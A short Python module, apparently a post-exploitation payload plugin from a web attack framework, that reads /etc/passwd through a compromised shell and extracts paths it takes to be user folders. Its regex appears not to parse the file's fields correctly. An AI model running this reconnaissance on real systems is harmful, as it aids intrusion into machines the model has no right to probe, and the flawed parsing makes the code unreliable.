import re
from plugins.attack.payloads.base_payload import base_payload

class users_folders(base_payload):
    '''
    '''
    def run_read(self):
                
        result = []
        users = []

        def parse_users_folders( etc_passwd ):
            user = re.findall('(?<=/)(.*?)\:', etc_passwd)
            if user:
                return user
            else:
                return ''

        for user in parse_users_folders(self.shell.read('/etc/passwd')):
            result.append('/'+str(user)+'/')
        
        return result
